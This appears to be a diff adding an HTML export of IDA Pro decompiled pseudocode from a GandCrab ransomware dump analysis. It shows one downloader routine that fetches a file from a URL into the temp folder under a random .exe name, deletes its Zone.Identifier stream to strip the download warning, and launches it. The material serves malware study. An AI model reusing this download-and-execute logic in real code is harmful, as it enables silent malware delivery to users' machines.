@@ -1,0 +1,142 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+<title>IDA - windrvcfg.DMP.idb (windrvcfg.DMP) C:\Users\Administrator\Desktop\Analysis\2019_analysis\20190206_GrandCrab_Dump\windrvcfg.DMP.idb</title>
+</head>
+<body bgcolor="#aaffff">
+<span style="white-space: pre; font-family: Courier; color: blue; background: #aaffff">
+
+<span style="color:gray">int __stdcall My_InternetDown_CreateProc(const void *a1)
+</span><span style="color:navy">{
+  </span><span style="color:black">int v1</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">DWORD v2</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">int v3</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">int v4</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">int v5</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">int v6</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">eax
+  </span><span style="color:black">int v8</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp-4h] [ebp-E98h]
+  </span><span style="color:black">int v9</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp-4h] [ebp-E98h]
+  </span><span style="color:black">int v10</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+30h] [ebp-E64h]
+  </span><span style="color:black">int v11</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+34h] [ebp-E60h]
+  </span><span style="color:black">int v12</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+38h] [ebp-E5Ch]
+  </span><span style="color:black">int v13</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+3Ch] [ebp-E58h]
+  </span><span style="color:black">int v14</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+40h] [ebp-E54h]
+  </span><span style="color:black">WCHAR v15</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+44h] [ebp-E50h]
+  </span><span style="color:gray">void *v16</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+250h] [ebp-C44h]
+  </span><span style="color:black">DWORD v17</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+254h] [ebp-C40h]
+  </span><span style="color:gray">char v18</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+258h] [ebp-C3Ch]
+  </span><span style="color:gray">char v19</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+25Ch] [ebp-C38h]
+  </span><span style="color:gray">HANDLE v20</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+468h] [ebp-A2Ch]
+  </span><span style="color:gray">char v21</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+46Ch] [ebp-A28h]
+  </span><span style="color:black">WCHAR v22</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+664h] [ebp-830h]
+  </span><span style="color:gray">char v23</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+86Ch] [ebp-628h]
+  </span><span style="color:gray">void *v24</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+A74h] [ebp-420h]
+  </span><span style="color:gray">char v25</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+A7Bh] [ebp-419h]
+  </span><span style="color:gray">char v26</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+A7Ch] [ebp-418h]
+  </span><span style="color:black">const unsigned __int16 *v27</span><span style="color:navy">; </span><span style="color:black">// </span><span style="color:#8080ff">[esp+C88h] [ebp-20Ch]
+  </span><span style="color:gray">char v28</span><span style="color:navy">; </span><span style="color:gray">// </span><span style="color:#8080ff">[esp+C8Ch] [ebp-208h]
+
+  </span>qmemcpy<span style="color:navy">(&amp;</span><span style="color:#8080ff">v21</span><span style="color:navy">, </span><span style="color:#8080ff">a1</span><span style="color:navy">, </span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+  </span><span style="color:#8080ff">v25 </span><span style="color:navy">= </span><span style="color:#00aa00">0</span><span style="color:navy">;
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v28</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v22</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v23</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+  </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v22</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, (</span><span style="color:gray">const char *</span><span style="color:navy">)&amp;</span>off_403AEC<span style="color:navy">, &amp;</span><span style="color:#8080ff">v21</span><span style="color:navy">);
+  </span><span style="color:#8080ff">v27 </span><span style="color:navy">= </span>PathFindFileNameW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v22</span><span style="color:navy">);
+  </span>GetModuleFileNameW<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">, (</span><span style="color:gray">LPWSTR</span><span style="color:navy">)&amp;</span><span style="color:#8080ff">v23</span><span style="color:navy">, </span><span style="color:#00aa00">0x208u</span><span style="color:navy">);
+  </span>ExpandEnvironmentStringsW<span style="color:navy">(</span>aTemp_0<span style="color:navy">, (</span><span style="color:gray">LPWSTR</span><span style="color:navy">)&amp;</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#00aa00">0x208u</span><span style="color:navy">);
+  </span><span style="color:#8080ff">v1 </span><span style="color:navy">= </span>j_wfopen<span style="color:navy">(&amp;</span><span style="color:#8080ff">v23</span><span style="color:navy">, &amp;</span>off_403B04<span style="color:navy">);
+  </span><span style="color:#8080ff">v12 </span><span style="color:navy">= </span><span style="color:#8080ff">v1</span><span style="color:navy">;
+  </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v1 </span><span style="color:navy">)
+  {
+    </span>j_fseek<span style="color:navy">(</span><span style="color:#8080ff">v1</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">2</span><span style="color:navy">);
+    </span><span style="color:#8080ff">v13 </span><span style="color:navy">= </span>j_ftell<span style="color:navy">(</span><span style="color:#8080ff">v12</span><span style="color:navy">);
+    </span>j_fclose<span style="color:navy">(</span><span style="color:#8080ff">v12</span><span style="color:navy">);
+  </span><span style="background:navy"></span><span style="color:navy">}
+  </span><span style="color:#8080ff">v2 </span><span style="color:navy">= </span>GetTickCount<span style="color:navy">();
+  </span>j_srand<span style="color:navy">(</span><span style="color:#8080ff">v2</span><span style="color:navy">);
+  </span><span style="color:#8080ff">v8 </span><span style="color:navy">= </span>j_rand<span style="color:navy">() % </span><span style="color:#00aa00">60000 </span><span style="color:navy">+ </span><span style="color:#00aa00">10000</span><span style="color:navy">;
+  </span><span style="color:#8080ff">v3 </span><span style="color:navy">= </span>j_rand<span style="color:navy">();
+  </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, (</span><span style="color:gray">const char *</span><span style="color:navy">)</span>aLsDDExe<span style="color:navy">, &amp;</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#8080ff">v3 </span><span style="color:navy">% </span><span style="color:#00aa00">60000 </span><span style="color:navy">+ </span><span style="color:#00aa00">10000</span><span style="color:navy">, </span><span style="color:#8080ff">v8</span><span style="color:navy">);
+  </span><span style="color:#8080ff">v16 </span><span style="color:navy">= </span>InternetOpenW<span style="color:navy">(</span>aMozilla50Macin_0<span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
+  </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v16 </span><span style="color:navy">)
+  {
+    </span><span style="color:#8080ff">v24 </span><span style="color:navy">= </span>InternetOpenUrlW<span style="color:navy">(</span><span style="color:#8080ff">v16</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v22</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
+    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v24 </span><span style="color:navy">)
+    {
+      </span><span style="color:#8080ff">v20 </span><span style="color:navy">= </span>CreateFileW<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">0x40000000u</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">2u</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
+      </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v20 </span><span style="color:navy">!= (</span><span style="color:gray">HANDLE</span><span style="color:navy">)</span><span style="color:#00aa00">-1 </span><span style="color:navy">)
+      {
+        </span><span style="color:#00aa00">while </span><span style="color:navy">( </span>InternetReadFile<span style="color:navy">(</span><span style="color:#8080ff">v24</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v28</span><span style="color:navy">, </span><span style="color:#00aa00">0x207u</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v17</span><span style="color:navy">) &amp;&amp; </span><span style="color:#8080ff">v17 </span><span style="color:navy">)
+          </span>WriteFile<span style="color:navy">(</span><span style="color:#8080ff">v20</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v28</span><span style="color:navy">, </span><span style="color:#8080ff">v17</span><span style="color:navy">, (</span><span style="color:gray">LPDWORD</span><span style="color:navy">)&amp;</span><span style="color:#8080ff">v18</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">);
+        </span>CloseHandle<span style="color:navy">(</span><span style="color:#8080ff">v20</span><span style="color:navy">);
+        </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+        </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, (</span><span style="color:gray">const char *</span><span style="color:navy">)</span>aLsZoneIdentifi_0<span style="color:navy">, &amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">);
+        </span>DeleteFileW<span style="color:navy">((</span><span style="color:gray">LPCWSTR</span><span style="color:navy">)&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">);
+        </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+        </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>wcscmp<span style="color:navy">(</span><span style="color:#8080ff">v27</span><span style="color:navy">, (</span><span style="color:gray">const unsigned __int16 *</span><span style="color:navy">)&amp;</span>off_403BF4<span style="color:navy">) )
+        {
+          </span><span style="color:#8080ff">v4 </span><span style="color:navy">= </span>j_wfopen<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, &amp;</span>off_403C00<span style="color:navy">);
+          </span><span style="color:#8080ff">v11 </span><span style="color:navy">= </span><span style="color:#8080ff">v4</span><span style="color:navy">;
+          </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v4 </span><span style="color:navy">)
+          {
+            </span>j_fseek<span style="color:navy">(</span><span style="color:#8080ff">v4</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">2</span><span style="color:navy">);
+            </span><span style="color:#8080ff">v14 </span><span style="color:navy">= </span>j_ftell<span style="color:navy">(</span><span style="color:#8080ff">v11</span><span style="color:navy">);
+            </span>j_fclose<span style="color:navy">(</span><span style="color:#8080ff">v11</span><span style="color:navy">);
+          </span><span style="background:navy"></span><span style="color:navy">}
+          </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#ff8000">v13 </span><span style="color:navy">!= </span><span style="color:#ff8000">v14 &amp;&amp; </span>My_CreateProc<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">) )
+          {
+            </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+            </span>ExitProcess<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
+          </span><span style="background:navy"></span><span style="color:navy">}
+        </span><span style="background:blue"></span><span style="color:navy">}
+        </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>My_CreateProc<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">) )
+        {
+          </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+          </span><span style="color:#8080ff">v25 </span><span style="color:navy">= </span><span style="color:#00aa00">1</span><span style="color:navy">;
+        </span><span style="background:#00aa00"></span><span style="color:navy">}
+      </span><span style="background:blue"></span><span style="color:navy">}
+      </span>CloseHandle<span style="color:navy">(</span><span style="color:#8080ff">v20</span><span style="color:navy">);
+    </span><span style="background:navy"></span><span style="color:navy">}
+    </span>InternetCloseHandle<span style="color:navy">(</span><span style="color:#8080ff">v24</span><span style="color:navy">);
+  </span><span style="background:navy"></span><span style="color:navy">}
+  </span>InternetCloseHandle<span style="color:navy">(</span><span style="color:#8080ff">v16</span><span style="color:navy">);
+  </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+  </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span><span style="color:#8080ff">v25 </span><span style="color:navy">)
+  {
+    </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+    </span><span style="color:#8080ff">v9 </span><span style="color:navy">= </span>j_rand<span style="color:navy">() % </span><span style="color:#00aa00">60000 </span><span style="color:navy">+ </span><span style="color:#00aa00">10000</span><span style="color:navy">;
+    </span><span style="color:#8080ff">v5 </span><span style="color:navy">= </span>j_rand<span style="color:navy">();
+    </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, (</span><span style="color:gray">const char *</span><span style="color:navy">)</span>aLsDDExe_0<span style="color:navy">, &amp;</span><span style="color:#8080ff">v26</span><span style="color:navy">, </span><span style="color:#8080ff">v5 </span><span style="color:navy">% </span><span style="color:#00aa00">60000 </span><span style="color:navy">+ </span><span style="color:#00aa00">10000</span><span style="color:navy">, </span><span style="color:#8080ff">v9</span><span style="color:navy">);
+    </span><span style="color:#00aa00">if </span><span style="color:navy">( </span>j_URLDownloadToFileW<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v22</span><span style="color:navy">, &amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">) )
+    {
+      </span>j_memset<span style="color:navy">(&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">);
+      </span>j_snwprintf<span style="color:navy">(&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">, </span><span style="color:#00aa00">520</span><span style="color:navy">, (</span><span style="color:gray">const char *</span><span style="color:navy">)</span>aLsZoneIdentifi_1<span style="color:navy">, &amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">);
+      </span>DeleteFileW<span style="color:navy">((</span><span style="color:gray">LPCWSTR</span><span style="color:navy">)&amp;</span><span style="color:#8080ff">v19</span><span style="color:navy">);
+      </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+      </span><span style="color:#00aa00">if </span><span style="color:navy">( !</span>wcscmp<span style="color:navy">(</span><span style="color:#8080ff">v27</span><span style="color:navy">, (</span><span style="color:gray">const unsigned __int16 *</span><span style="color:navy">)&amp;</span>off_403C4C<span style="color:navy">) )
+      {
+        </span><span style="color:#8080ff">v6 </span><span style="color:navy">= </span>j_wfopen<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">, &amp;</span>off_403C58<span style="color:navy">);
+        </span><span style="color:#8080ff">v10 </span><span style="color:navy">= </span><span style="color:#8080ff">v6</span><span style="color:navy">;
+        </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#8080ff">v6 </span><span style="color:navy">)
+        {
+          </span>j_fseek<span style="color:navy">(</span><span style="color:#8080ff">v6</span><span style="color:navy">, </span><span style="color:#00aa00">0</span><span style="color:navy">, </span><span style="color:#00aa00">2</span><span style="color:navy">);
+          </span><span style="color:#8080ff">v14 </span><span style="color:navy">= </span>j_ftell<span style="color:navy">(</span><span style="color:#8080ff">v10</span><span style="color:navy">);
+          </span>j_fclose<span style="color:navy">(</span><span style="color:#8080ff">v10</span><span style="color:navy">);
+        </span><span style="background:navy"></span><span style="color:navy">}
+        </span><span style="color:#00aa00">if </span><span style="color:navy">( </span><span style="color:#ff8000">v13 </span><span style="color:navy">!= </span><span style="color:#ff8000">v14 &amp;&amp; </span>My_CreateProc<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">) )
+        {
+          </span>Sleep<span style="color:navy">(</span><span style="color:#00aa00">0x1F4u</span><span style="color:navy">);
+          </span>ExitProcess<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
+        </span><span style="background:navy"></span><span style="color:navy">}
+      </span><span style="background:blue"></span><span style="color:navy">}
+      </span>My_CreateProc<span style="color:navy">(&amp;</span><span style="color:#8080ff">v15</span><span style="color:navy">);
+    </span><span style="background:navy"></span><span style="color:navy">}
+  </span><span style="background:blue"></span><span style="color:navy">}
+  </span><span style="color:#00aa00">return </span>RtlExitUserThread<span style="color:navy">(</span><span style="color:#00aa00">0</span><span style="color:navy">);
+</span><span style="background:navy"></span><span style="color:navy">}
+</span></body></html>
